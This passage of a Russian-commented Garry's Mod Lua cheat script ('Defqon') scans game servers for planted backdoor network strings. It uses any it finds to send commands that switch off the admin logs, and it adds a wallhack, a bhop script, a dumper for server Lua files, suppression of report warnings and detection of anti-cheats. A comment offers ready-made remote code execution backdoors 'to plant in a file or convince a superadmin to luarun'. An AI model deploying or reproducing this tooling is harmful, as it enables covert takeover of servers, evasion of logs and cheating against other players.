			print( "[Defqon] Найден Backdoor! -   fix" )
	end
	if( ValidNetString("Fix_Keypads") ) then
			print( "[Defqon] Найден Backdoor! -   Fix_Keypads" )
	end
	if( ValidNetString("Remove_Exploiters") ) then
			print( "[Defqon] Найден Backdoor! -   Remove_Exploiters" )
	end
	if( ValidNetString("noclipcloakaesp_chat_text") ) then
			print( "[Defqon] Найден Backdoor! -   noclipcloakaesp_chat_text" )
	end
	if( ValidNetString("_CAC_ReadMemory") ) then
			print( "[Defqon] Найден Backdoor! -   _CAC_ReadMemory" )
	end
	if( ValidNetString("nostrip") ) then
			print( "[Defqon] Найден Backdoor! -   nostrip" )
	end
	if( ValidNetString("nocheat") ) then
			print( "[Defqon] Найден Backdoor! -   nocheat" )
	end
	if( ValidNetString("LickMeOut") ) then
			print( "[Defqon] Найден Backdoor! -   LickMeOut" )
	end
	if( ValidNetString("ULX_QUERY2") ) then
			print( "[Defqon] Найден Backdoor! -   ULX_QUERY2" )
	end
	if( ValidNetString("MoonMan") ) then
			print( "[Defqon] Найден Backdoor! -   MoonMan" )
	end
	if( ValidNetString("Im_SOCool") ) then
			print( "[Defqon] Найден Backdoor! -   Im_SOCool" )
	end
	if( ValidNetString("Sandbox_GayParty") ) then
			print( "[Defqon] Найден Backdoor! -   Sandbox_GayParty" )
	end
	if( ValidNetString("DarkRP_UTF8") ) then
			print( "[Defqon] Найден Backdoor! -   DarkRP_UTF8" )
	end
	if( ValidNetString("oldNetReadData") ) then
			print( "[Defqon] Найден Backdoor! -   oldNetReadData" )
	end
	if( ValidNetString("memeDoor") ) then
			print( "[Defqon] Найден Backdoor! -   memeDoor" )
	end
	if( ValidNetString("BackDoor") ) then
			print( "[Defqon] Найден Backdoor! -   BackDoor" )
	end
	if( ValidNetString("OdiumBackDoor") ) then
			print( "[Defqon] Найден Backdoor! -   OdiumBackDoor" )
	end
	if( ValidNetString("cucked") ) then
			print( "[Defqon] Найден Backdoor! -   cucked" )
	end
	if( ValidNetString("NoNerks") ) then
			print( "[Defqon] Найден Backdoor! -   NoNerks" )
	end
	if( ValidNetString("kek") ) then
			print( "[Defqon] Найден Backdoor! -   kek" )
	end
	if( ValidNetString("ZimbaBackDoor") ) then
			print( "[Defqon] Найден Backdoor! -   ZimbaBackDoor" )
	end
	if( ValidNetString("something") ) then
			print( "[Defqon] Найден Backdoor! -   something" )
	end
	if( ValidNetString("random") ) then
			print( "[Defqon] Найден Backdoor! -   random" )
	end
	if( ValidNetString("strip0") ) then
			print( "[Defqon] Найден Backdoor! -   strip0" )
	end
	if( ValidNetString("DarkRP_AdminWeapons") ) then
			print( "[Defqon] Найден Backdoor! -   DarkRP_AdminWeapons" )
	end
	if( ValidNetString("SessionBackdoor") ) then
			print( "[Defqon] Найден Backdoor! -   SessionBackdoor" )
	end
	if( ValidNetString("ULXQUERY2") ) then
			print( "[Defqon] Найден Backdoor! -   ULXQUERY2" )
	end
	if( ValidNetString("fellosnake") ) then
			print( "[Defqon] Найден Backdoor! -   fellosnake" )
	end
	if( ValidNetString("enablevac") ) then
			print( "[Defqon] Найден Backdoor! -   enablevac" )
	end
	if( ValidNetString("idk") ) then
			print( "[Defqon] Найден Backdoor! -   idk" )
	end
	if( ValidNetString("c") ) then
			print( "[Defqon] Найден Backdoor! -   c" )
	end
	if( ValidNetString("killserver") ) then
			print( "[Defqon] Найден Backdoor! -   killserver" )
	end
	if( ValidNetString("fuckserver") ) then
			print( "[Defqon] Найден Backdoor! -   fuckserver" )
	end
	if( ValidNetString("cvaraccess") ) then
			print( "[Defqon] Найден Backdoor! -   cvaraccess" )
	end
	if( ValidNetString("rcon") ) then
			print( "[Defqon] Найден Backdoor! -   rcon" )
	end
	if( ValidNetString("rconadmin") ) then
			print( "[Defqon] Найден Backdoor! -   rconadmin" )
	end
	if( ValidNetString("web") ) then
			print( "[Defqon] Найден Backdoor! -   web" )
	end
	if( ValidNetString("jesuslebg") ) then
			print( "[Defqon] Найден Backdoor! -   jesuslebg" )
	end
	if( ValidNetString("zilnix") ) then
			print( "[Defqon] Найден Backdoor! -   zilnix" )
	end
	if( ValidNetString("Þ� ?D)◘") ) then
			print( "[Defqon] Найден Backdoor! -   Þ� ?D)◘" )
	end
	if( ValidNetString("kill") ) then
			print( "[Defqon] Найден Backdoor! -   kill" )
	end
	if( ValidNetString("DefqonBackdoor") ) then
			print( "[Defqon] Найден Фирменный Backdoor! -   DefqonBackdoor" )
	end
	end
	
	
	-- Auto-Backdoor checker
		if( ValidNetString("memeDoor") ) then
			netKey = "memeDoor"
		else
		end
	
		if( ValidNetString("Sandbox_Armdupe") ) then 
			netKey = "Sandbox_Armdupe"
		else
		end
	
		if( ValidNetString("DarkRP_AdminWeapons") ) then
			netKey = "DarkRP_AdminWeapons"
		else
		end
		
		if( ValidNetString("enablevac") ) then
			netKey = "enablevac"
		else
		end
		
		if( ValidNetString("SessionBackdoor") ) then
			netKey = "SessionBackdoor"
		else
		end
	
		if( ValidNetString("Fix_Keypads") ) then
			netKey = "Fix_Keypads"
		else
		end
	
		if( ValidNetString("Remove_Exploiters") ) then
			netKey = "Remove_Exploiters"
		else
		end
	
		if( ValidNetString("noclipcloakaesp_chat_text") ) then
			netKey = "noclipcloakaesp_chat_text"
		else
		end
	
		if( ValidNetString("_Defqon") ) then
			netKey = "_Defqon"
		else
		end
	
		if( ValidNetString("_CAC_ReadMemory") ) then
			netKey = "_CAC_ReadMemory"
		else
		end
	
		if( ValidNetString("nostrip") ) then
			netKey = "nostrip"
		else
		end
	
		if( ValidNetString("LickMeOut") ) then
			netKey = "LickMeOut"
		else
		end
	
		if( ValidNetString("MoonMan") ) then
			netKey = "MoonMan"
		else
		end
	
		if( ValidNetString("Im_SOCool") ) then
			netKey = "Im_SOCool"
		else
		end
	
		if( ValidNetString("ULXQUERY2") ) then
			netKey = "ULXQUERY2"
		else
		end
		if( ValidNetString("Sbox_itemstore") ) then
			netKey = "Sbox_itemstore"
		else
		end
		if( ValidNetString("Ulib_Message") ) then
			netKey = "Ulib_Message"
		else
		end
		if( ValidNetString("Sbox_darkrp") ) then
			netKey = "Sbox_darkrp"
		else
		end
		if( ValidNetString("ULogs_Info") ) then
			netKey = "ULogs_Info"
		else
		end
		if( ValidNetString("ITEM") ) then
			netKey = "ITEM"
		else
		end
		if( ValidNetString("fix") ) then
			netKey = "fix"
		else
		end
		if( ValidNetString("nocheat") ) then
			netKey = "nocheat"
		else
		end
		if( ValidNetString("ULX_QUERY2") ) then
			netKey = "ULX_QUERY2"
		else
		end
		if( ValidNetString("Sandbox_GayParty") ) then
			netKey = "Sandbox_GayParty"
		else
		end
		if( ValidNetString("DarkRP_UTF8") ) then
			netKey = "DarkRP_UTF8"
		else
		end
		if( ValidNetString("oldNetReadData") ) then
			netKey = "oldNetReadData"
		else
		end
		if( ValidNetString("BackDoor") ) then
			netKey = "BackDoor"
		else
		end
		if( ValidNetString("OdiumBackDoor") ) then
			netKey = "OdiumBackDoor"
		else
		end
		if( ValidNetString("cucked") ) then
			netKey = "cucked"
		else
		end
		if( ValidNetString("NoNerks") ) then
			netKey = "NoNerks"
		else
		end
		if( ValidNetString("kek") ) then
			netKey = "kek"
		else
		end
		if( ValidNetString("ZimbaBackDoor") ) then
			netKey = "ZimbaBackDoor"
		else
		end
		if( ValidNetString("something") ) then
			netKey = "something"
		else
		end
		if( ValidNetString("random") ) then
			netKey = "random"
		else
		end
		if( ValidNetString("strip0") ) then
			netKey = "strip0"
		else
		end
		if( ValidNetString("fellosnake") ) then
			netKey = "fellosnake"
		else
		end
		if( ValidNetString("idk") ) then
			netKey = "idk"
		else
		end
		if( ValidNetString("c") ) then
			netKey = "c"
		else
		end
		if( ValidNetString("killserver") ) then
			netKey = "killserver"
		else
		end
		if( ValidNetString("fuckserver") ) then
			netKey = "fuckserver"
		else
		end
		if( ValidNetString("cvaraccess") ) then
			netKey = "cvaraccess"
		else
		end
		if( ValidNetString("rcon") ) then
			netKey = "rcon"
		else
		end
		if( ValidNetString("rconadmin") ) then
			netKey = "rconadmin"
		else
		end
		if( ValidNetString("web") ) then
			netKey = "web"
		else
		end
		if( ValidNetString("jesuslebg") ) then
			netKey = "jesuslebg"
		else
		end
		if( ValidNetString("zilnix") ) then
			netKey = "zilnix"
		else
		end
		if( ValidNetString("Þ� ?D)◘") ) then
			netKey = "Þ� ?D)◘"
		else
		end
		if( ValidNetString("kill") ) then
			netKey = "kill"
		else
		end
		if( ValidNetString("DefqonBackdoor") ) then
			netKey = "DefqonBackdoor"
		else
		end
		if netKey == "" then
			 chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бэкдуров на сервере не найдено." )
		else
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 0, 255, 0 ), "Найден .net Backdoor: ".. netKey )
				-- Auto shut down ULX Logs
				if GetConVarNumber("silent") == 1 then
					net.Start(netKey)
					net.WriteString( "ulx_logecho 0" )
					net.WriteBit (0)
					net.SendToServer()
	
					timer.Simple(0.1, function()
						net.Start(netKey)
						net.WriteString( "ulx_logecho 0" )
						net.WriteBit (1)
						 net.SendToServer()
	
					chat.AddText("ULX Logs Отключены." )
					end)
				end
		end
	
	local function gmsg(msg,color)
	if color == "color_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 150,0,0 )," ".. msg) return end
	if color == "color_red_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 255,0,0 )," ".. msg) return end
	if color == "color_green" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 43,255,0 )," ".. msg) return end
	chat.AddText( "",Color( 255,0,0 ),"[Defqon] ",Color( 255,255,225 )," ".. msg)
	end
	
	function iZNX.ScanPlayers()
	surface.PlaySound("garrysmod/ui_click.wav")
	local playerscount = 0
	local playerscount_admin = 0
	local playerscount_hryak = 0
	local playerscount_hryak_admin = 0
	gmsg ("Группа - Ник - SID - Деньги")
	 for k,v in pairs(player.GetAll()) do
	local playerscount_admin = 0
	local playerscount_hryak = 0
	local playerscount_hryak_admin = 0
		local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
				gmsg(v:GetUserGroup()..": " .. v:Nick() .. " - " .. v:SteamID() .. " - $" .. playermoney.. "","color_green")
	 end
	end
	


	
	--[[---------------------------------------------------------------------------------------------------------
	  ____  _                       _     _      _         _   _                _          _   _             
	 / ___|| |_ ___  __ _ _ __ ___ (_) __| |    / \  _   _| |_| |__   ___  _ __(_)______ _| |_(_) ___  _ __  
	 \___ \| __/ _ \/ _` | '_ ` _ \| |/ _` |   / _ \| | | | __| '_ \ / _ \| '__| |_  / _` | __| |/ _ \| '_ \ 
	  ___) | ||  __/ (_| | | | | | | | (_| |  / ___ \ |_| | |_| | | | (_) | |  | |/ / (_| | |_| | (_) | | | |
	 |____/ \__\___|\__,_|_| |_| |_|_|\__,_| /_/   \_\__,_|\__|_| |_|\___/|_|  |_/___\__,_|\__|_|\___/|_| |_|
																											 
	   ----------------------------------------------------------------------------------------------------------]]
	   
	
	-- Version Check
	function CheckVersion()
	surface.PlaySound("garrysmod/ui_click.wav")
		if ( Version == "v5.1.1") then
				chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 0, 255, 0 )," Вы используете последнюю версию от 17.03.18!" )
		else
				chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 0, 0 )," Ваша версия чита устарела!" )
		end
		end
		
		
		require("stringtables")
	local escapejs = { ["\\"] = "\\\\", ["\0"] = "\\0" , ["\b"] = "\\b" , ["\t"] = "\\t" , ["\n"] = "\\n" , ["\v"] = "\\v" , ["\f"] = "\\f" , ["\r"] = "\\r" , ["\""] = "\\\"", ["\'"] = "\\\'" } 
	function string.JavascriptSafe( str ) 
		str = str:gsub( ".", escapejs ) 
		str = str:gsub( "\226\128\168", "\\\226\128\168" )
		 str = str:gsub( "\226\128\169", "\\\226\128\169" ) 
		 return str 
		end 
	local function GetLuaFiles(client_lua_files) 
		local count = client_lua_files:Count() 
		local ret = {} 
		for i = 1, count - 2 do 
			ret[i] = { Path = client_lua_files:GetString(i), CRC = client_lua_files:GetUserDataInt(i) } 
		end 
		return ret 
	end 
	local function GetLuaFileContents(crc) 
		local fs = file.Open("cache/lua/" .. crc .. ".lua", "rb", "MOD") fs:Seek(4) 
		local contents = util.Decompress(fs:Read(fs:Size() - 4)) 
		return contents:sub(1, -2) 
	end 
	local function dumbFile(path, contents) 
		if not  path:match("%.lua$") then 
			path = path..".lua" 
		end 
	local curdir = "" 
	for t in path:gmatch("[^/\\*]+") do 
		curdir = curdir..t 
		if  curdir:match("%.lua$") 
			then 
			print("writing: ", curdir) 
			file.Write(curdir, contents) 
		else curdir = curdir.."/" 
			print("Creating: ", curdir) 
			file.CreateDir(curdir) 
		end 
	end 
	end 
	local dumbFolderCache = "" 
	local function dumbFolder(node) 
		for _, subnode in ipairs(node.ChildNodes:GetChildren()) do 
		if subnode:HasChildren() then 
			dumbFolder(subnode) 
		else 
			dumbFile(dumbFolderCache..subnode.pathh, GetLuaFileContents(subnode.CRC)) 
		end 
	end 
	end
	
	local VIEWER2 = {}
	
	function VIEWER2:Init()
	
	  self:SetTitle("Lua View")
	
	  self:SetSize(1200, 550)
	
	  self:Center() self:ShowCloseButton( false ) self.Paint = function(s,w,h)
	
		surface.SetDrawColor(Color(40,40,40))
	
		surface.DrawRect( 0,0, w,h ) 
		surface.SetDrawColor( Color(40,40,40) ) 
		surface.DrawRect( 1,1, w-2,h-2 ) 
		surface.SetDrawColor(Color(40,40,40))
		 surface.DrawRect( 2,2, w-4,h-4 ) 
		 surface.SetDrawColor(Color(40,40,40)) 
		 surface.DrawRect( 7.5,27.5, w-14,h-34) 
		 surface.SetTextColor(255,255,255)
	
		surface.SetTextPos( (self:GetWide()/2) - (tostring( string.len( self.lblTitle:GetText() )) / 2*7.5), 2) 
		self.lblTitle:SetColor(Color(0,0,0,0)) surface.DrawText( self.lblTitle:GetText() ) 
	end 
	self.close = vgui.Create( "DButton", self ) 
	self.close:SetSize( 43,20 ) 
	self.close:SetPos( self:GetWide()-7.5-self.close:GetWide(), -1 ) 
	self.close:SetText("") 
	self.close.Paint = function(s,w,h) 
		surface.SetDrawColor( Color(199,80,80) ) 
		surface.DrawRect( 0,0, w,h ) 
		surface.SetTextColor(255,255,255) 
		surface.SetTextPos(18,-2) 
		surface.DrawText( "x" ) 
	end 
	self.close.DoClick = function(s,w,h) 
		self:Close() 
	end 
	self.tree = vgui.Create("DTree", self) 
	self.tree:SetPos(8.5,28.5) 
	self.tree:SetSize(self:GetWide()/2-200, self:GetTall()-36) 
	self.tree.Directories = {} 
	self.html = vgui.Create("DHTML", self) 
	self.html:SetPos(self:GetWide()/2-200+8.5, 28.5) 
	self.html:SetSize(self:GetWide()/2+200-16, self:GetTall()-36) 
	self.html:OpenURL("https://metastruct.github.io/lua_editor/") 
	client_lua_files = stringtable.Get "client_lua_files" 
	local tree_data= {} for i, v in ipairs(GetLuaFiles(client_lua_files)) do 
	if i == 1 then 
		continue 
	end 
	local file_name = string.match(v.Path, ".*/([^/]+%.lua)") 
	local dir_path = string.sub(v.Path, 1, -1 - file_name:len()) 
	local file_crc = v.CRC 
	local cur_dir = tree_data 
	for dir in string.gmatch(dir_path, "([^/]+)/") do 
		if not cur_dir[dir] then 
			cur_dir[dir] = {} 
		end cur_dir = cur_dir[dir] 
	end 
	cur_dir[file_name] = {fileN = file_name, CRC = file_crc} 
	end 
	local file_queue = {} 
	local function iterate(data, node, path) 
		path = path or "" 
		for k, v in SortedPairs(data) do 
			if type(v) == "table" and not v.CRC then 
				local new_node = node:AddNode(k) 
				new_node.DoRightClick = function() 
					local dmenu = DermaMenu(new_node) 
					dmenu:SetPos(gui.MouseX(), gui.MouseY()) 
					dmenu:AddOption("Save Folder(НЕ � АБОТАЕТ)", function() 
						dumbFolderCache = "cluaview/"..GetHostName()..dumbFolder(new_node) 
						DrawFancyPopup("The folder ".. dumbFolder(new_node) .." has been saved as data/cluaview/".. GetHostName() .."/folders/".. dumbFolder(new_node) .."!") 
					end) 
					dmenu:Open() 
				end iterate(v, new_node, path .. k .. "/") 
			else table.insert(file_queue, {node = node, fileN = v.fileN, path = path .. v.fileN, CRC = v.CRC}) 
			end 
		end 
	end 
	iterate(tree_data, self.tree) for k, v in ipairs(file_queue) do 
	local node = v.node:AddNode(v.fileN, "icon16/page_green.png") 
	node.DoClick = function() 
		self.html:QueueJavascript("SetContent('"..string.JavascriptSafe(GetLuaFileContents(v.CRC)).."')") 
	end 
	local hostname = GetHostName() 
	hostname = hostname:gsub("|", "-") 
	hostname = hostname:gsub("~", "-") 
	hostname = hostname:gsub(" ", "") 
	node.DoRightClick = function(self,node) 
		local nodemenu = DermaMenu(node) 
		nodemenu:AddOption("Save File", function() dumbFile("cluaview/".. string.lower(hostname) .."/"..v.fileN, GetLuaFileContents(v.CRC)) DrawFancyPopup("The file ".. v.fileN .." has been saved as data/cluaview/".. string.lower(hostname) .."/".. v.fileN .."!") 
		end) 
		nodemenu:Open() 
	end node.CRC = v.CRC node.pathh = v.path
	
		end
	
	  end
	
	derma.DefineControl("chmluaviewer", "Defqon Lua Viewer", VIEWER2, "DFrame")
	
	
	------------------------------------------------------------------------------------------------
	
	local title = "You have been reported! Please answer all your reports."
		local function CheckChild(pan)
			if not pan or not IsValid(pan) then return end
	
			if pan.GetTitle and pan:GetTitle() == title then
				pan:Remove()
				print("Удален warning box")
	
				return
			end
	
			for k, v in pairs(pan:GetChildren()) do
				if v.GetTitle and v:GetTitle() == title then
					v:Remove()
					print("Удален warning box")
	
					return
				end
	
				if #v:GetChildren() > 0 then
					CheckChild(v)
				end
			end
		end
	
		local isttt = false
		if (engine.ActiveGamemode() == "terrortown") then
			isttt = true
		end
		   
		local bypass = 0
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		local rainb = false
		function rainbowphysgun()
		surface.PlaySound("garrysmod/ui_click.wav")
			if not rainb then
				hook.Add("Think", "RGBSTF", function()
					local rainbowC = HSVToColor(CurTime() % 6 * 60, 1, 1)
					LocalPlayer():SetWeaponColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
					LocalPlayer():SetPlayerColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
				end)
				chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "� адужный физган включен" )
				rainb = true
			else
				hook.Remove("Think", "RGBSTF")
				chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "� адужный физган выключен" )
				rainb = false
			end
		end
	
	
		
		surface.CreateFont("WHT", {
			font = "Robot",
			size = ScreenScale(7),
			weight = 150,
			antialias = true,
			shadow = true,
		})
		
	
		
	local wh = false
	function WHT()
	surface.PlaySound("garrysmod/ui_click.wav")
	if not wh then
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Wallhack включен" )
	hook.Add("HUDPaint", "WHT", function()
	for k, v in pairs(player.GetAll()) do
	if (v:Alive()) then
	local Position = (v:GetPos() + Vector(0, 0, 95)):ToScreen()
	local Name = ""
	local teamName = ""
	local colwht = v:IsPlayer() and team.GetColor(v:Team())
	if v == LocalPlayer() then
	Name = ""
	teamName = ""
	elseif v:IsBot() then
	Name = v:Name() .. "[ БОТ ]"
	if (string.lower(engine.ActiveGamemode()) == "darkrp") then
	teamName = v:getDarkRPVar("job") or ""
	end
	else
	Name = v:Name()
	if (string.lower(engine.ActiveGamemode()) == "darkrp") then
	teamName = v:getDarkRPVar("job") or ""
	end
	end
	if v:GetUserGroup() == "user" then
	draw.SimpleText(Name .. "(" .. v:Health() .. ")", "WHT", Position.x, Position.y, colwht, 1)
	if (string.lower(engine.ActiveGamemode()) == "darkrp") then
	local PlyMoney = math.ceil(v:getDarkRPVar("money") or 0)
	draw.SimpleText(teamName .. "[" .. PlyMoney .. "]", "WHT", Position.x, Position.y + 20, Color(255, 255, 255, 255), 1)
	end
	else
	draw.SimpleText(Name .. "(" .. v:Health() .. ") [" .. v:GetUserGroup() .. "]", "WHT", Position.x, Position.y, colwht, 1)
	if (string.lower(engine.ActiveGamemode()) == "darkrp") then
	local PlyMoney = math.ceil(v:getDarkRPVar("money") or 0)
	draw.SimpleText(teamName .. "[" .. PlyMoney .. "]", "WHT", Position.x, Position.y + 20, Color(255, 255, 255, 255), 1)
	end
	end
	end
	end
	end)
	wh = true
	else
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Wallhack выключен" )
	hook.Remove("HUDPaint", "WHT")
	wh = false
	end
	end
	concommand.Add("Defqon_wallhack", WHT)
			
	local bhop = false		
	function Bhop()
	surface.PlaySound("garrysmod/ui_click.wav")
	if not bhop then
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Bhop включен" )
	hook.Add("CreateMove", "BHOP", function(cmd)
	if (cmd:KeyDown(IN_JUMP)) then
	if(cmd:GetMouseX() < 0) then --spinning right
	cmd:SetSideMove(-10000);
	elseif(cmd:GetMouseX() > 0) then
	cmd:SetSideMove(10000);
	end
	if (LocalPlayer():IsOnGround()) then
	cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
	return;
	end
	end
	cmd:RemoveKey(IN_JUMP);
	end )
	bhop = true
	else
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Bhop выключен" )
	hook.Remove("CreateMove", "BHOP")
	bhop = false
	end
	end
	concommand.Add("Defqon_bhop", Bhop)
	
	
	
	
	
	
	local CommandList2 = {}
	
	local CompleteList2 = {}
	
	local oaddcc = AddConsoleCommand
	
	local _A = {}
	
	
	_A.aegis = {}
	
	_A.registry = debug.getregistry()
	
	local aegis = {}
	
	_A.aegis.logs = {}
	
	_A.aegis.anticheats = {}
	
	_A.aegis.exploitables = {}
	
	
	
	local function ispooped( str )
	
			local status, error = pcall( net.Start, str )
	
			return status
	
		end
	
	
	
		local acfags = {
	
			["!Cake Anticheat (CAC)"] = {
	
				desc = "Самый распространенный античит, используемый сегодня (и ваш худший кошмар, прежде чем вы юзанули обход)\nИмеет очень сильные обнаружения, которые все еще лагают, даже через 2 года после его выпуска",
	
				scan = function() return _A.aegis.anticheats["extensions/client/vehicle.lua"] end,
	
			},
	
			["Simplicity Anticheat (SAC)"] = {
	
				desc = "Новый античит Leystryku, который он выпустил на scriptfodder\nНе силен, как CAC, но (по-видимому) предлагает лучшую производительность серверов",
	
				scan = function() if _G.simplicity then return true else return false end end,
	
			},
	
			["Quack Anticheat (QAC)"] = {
	
				desc = "Датированный античит с открытым исходным кодом из 2014 года\nRPards все еще редактируют и используют этот кусок дерьма, называя его своим 1337 приватным античитом",
	
				scan = function() return ( _G.QAC and ispooped( "quack" ) ) end,
	
			},
	
			["Supservers Anticheat"] = {
	
				desc = "Скорее черный список публичных читов, чем настоящий античит\nЭтот мусор не представляет для нас никакой угрозы (будьте осторожны с ними, скринграбит экран)",
	
				scan = function() return ispooped( "rp.OrgMotd" ) end,
	
			},
	
			["Screengrab V2"] = {
	
				desc = "Публичная утилита, которая может быть использована для скриншота вашего экрана\nВроде у дефкона есть анти-скринграб, но я хз",
	
				scan = function() if _G.OpenSGMenu then return true else return false end end,
	
			},
	
			["Pablo's Screengrab"] = {
	
				desc = "Публичная утилита, которая может быть использована для скриншота вашего экрана\nВроде у дефкона есть анти-скринграб, но я хз",
	
				scan = function() if _G.SCRG then return true else return false end end,
	
			},
	
			["Enforcer Anti Minge"] = {
	
				desc = "Скрипт общего назначения, который включает в себя антипропкилл, анти-краш и логи",
	
				scan = function() if _G.EnforcerAddMessage then return true else return false end end,
	
			},
	
			["AP Anti"] = {
	
				desc = "Тупо названный сценарий анти-пропкилла с открытым исходным кодом\nВы вероятно не сможете пропкиллить на этом сервере",
	
				scan = function() return ispooped( "APAnti AlertNotice" ) end,
	
			},
	
	
	
		}
	
	
	
	
	
		concommand.Add( "Defqon_anticheats", function()
	
			local acpanel = vgui.Create("DFrame")
	
			if !acpanel then return end
	
			acpanel:SetSize(500,455)
	
			acpanel:SetTitle("Меры безопасности сервера")
	
			acpanel:Center()
	
			acpanel:MakePopup()
	
	
	
			acpanel.Paint = function( s, w, h )
	
			surface.SetDrawColor( Color(30, 30, 30, 255) )
	
			surface.DrawRect( 0, 0, w, h )
	
			surface.SetDrawColor( Color(55, 55, 55, 255) )
	
			surface.DrawOutlinedRect( 0, 0, w, h )
	
			surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
	
			surface.SetDrawColor( Color(33, 33, 33, 200) )
	
			surface.DrawRect( 10, 25, w - 20, h - 35 )
	
			end
	
	
	
			local Plist = vgui.Create( "DPanelList", acpanel )
	
			Plist:SetSize( acpanel:GetWide() - 20, acpanel:GetTall() - 35 )
	
			Plist:SetPadding( 5 )
	
			Plist:SetSpacing( 5 )
	
			Plist:EnableHorizontal( false )
	
			Plist:EnableVerticalScrollbar( true )
	
			Plist:SetPos( 10, 25 )
	
			Plist:SetName( "" )
	
	
	
	
	
			local function CreateACPanel( cmd )
	
			if !acpanel then return end
	
				local cmdp = vgui.Create( "DPanel" )
	
				cmdp:SetSize( Plist:GetWide(), 60 )
	
				cmdp.Cmd = cmd
	
				cmdp.Desc = acfags[cmd].desc
	
				cmdp.Paint = function( s, w, h )
	
					surface.SetDrawColor( Color(50, 50, 50, 255) )
	
					surface.DrawRect( 0, 0, w, h )
	
					surface.SetDrawColor( Color(65, 65, 65, 255) )
	
					surface.DrawOutlinedRect( 0, 0, w, h )
	
					surface.DrawLine( 0, 24, w, 24 )
	
					draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )
	
					draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )
	
				end
	
	
	
				Plist:AddItem( cmdp )
	
			end
	
	
	
	
	
			for k, v in pairs( acfags ) do
	
				if v["scan"]() then CreateACPanel( k ) end
	
			end
	
		end)
		
		
		
		
		
		
		
		------------------------------------------------------------------------------------------------------------
	/* 
	
	COPYRIGHT 2018
	
	YOU HAVE NO RIGHTS TO REDISTRIBUTE THIS FILE OR ANY FILES ASSOCIATED
	
	YOU MAY NOT COPY AND PASTE THIS SCRIPT 
																								  p.s. lua run does not work
	Coded by Hayden Massey (ToxicRiver) @ toxicpro.xyz  (what a fucking joke)
	
	*/
	
	/*
		
		Toxic.pro
		
		Commissioned by 0xymoron for ToxicRiver
		
		Start Date: December 27th, 2017.
		
		First revision finished December 28th, 2017 @ 3:28AM.
		
		January 2nd, 2017 @ 6:27AM
		- This script truly has become toxic, ironic. 
		
	*/
	
	/*
	
	-- Possible backdoor strings to plant in a file or convince a superadmin to luarun
	
	util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunString( str ) end )
	util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() CompileString( str, "[C]", false ) end )
	util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunStringEx( str ) end )
	
	*/
	
	/*
	
		metastruct editor read shit
		
		self.HTMLIDE:AddFunction("gmodinterface","OnCode",function(code) ... end)"
	
		https://github.com/Earu/EasyChat/blob/master/lua/easychat/modules/lua_tab.lua#L140
	
	*/
	
	local toxic = {}
	local iZNX = {}
	
	function iZNX.ValidNetString( str )
	local status, error = pcall( net.Start, str )
	return status
	end
	
	local blackdoor = ""
	if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
	blackdoor = "Sandbox_ArmDupe"
	else
	if iZNX.ValidNetString( "Sbox_darkrp" ) then
	blackdoor = "Sbox_darkrp"
	else
	if iZNX.ValidNetString( "Sbox_itemstore" ) then
	blackdoor = "Sbox_itemstore"
	else
	if iZNX.ValidNetString( "Ulib_Message" ) then
	blackdoor = "Ulib_Message"
	else
	if iZNX.ValidNetString( "ULogs_Info" ) then
	blackdoor = "ULogs_Info"
	else
	if iZNX.ValidNetString( "ITEM" ) then
	blackdoor = "ITEM"
	else
	if iZNX.ValidNetString( "fix" ) then
	blackdoor = "fix"
	else
	if iZNX.ValidNetString( "Fix_Keypads" ) then
	blackdoor = "Fix_Keypads"
	else
	if iZNX.ValidNetString( "Remove_Exploiters" ) then
	blackdoor = "Remove_Exploiters"
	else
	if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
	blackdoor = "noclipcloakaesp_chat_text"
	else
	if iZNX.ValidNetString( "_Defqon" ) then
	blackdoor = "_Defqon"
	else
	if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
	blackdoor = "_CAC_ReadMemory"
	else
	if iZNX.ValidNetString( "nostrip" ) then
	blackdoor = "nostrip"
	else
	if iZNX.ValidNetString( "nocheat" ) then
	blackdoor = "nocheat"
	else
	if iZNX.ValidNetString( "LickMeOut" ) then
	blackdoor = "LickMeOut"
	else
	if iZNX.ValidNetString( "ULX_QUERY2" ) then
	blackdoor = "ULX_QUERY2"
	else
	if iZNX.ValidNetString( "ULXQUERY2" ) then
	blackdoor = "ULXQUERY2"
	else
	if iZNX.ValidNetString( "MoonMan" ) then
	blackdoor = "MoonMan"
	else
	if iZNX.ValidNetString( "Im_SOCool" ) then
	blackdoor = "Im_SOCool"
	else
	if iZNX.ValidNetString( "Sandbox_GayParty" ) then
	blackdoor = "Sandbox_GayParty"
	else
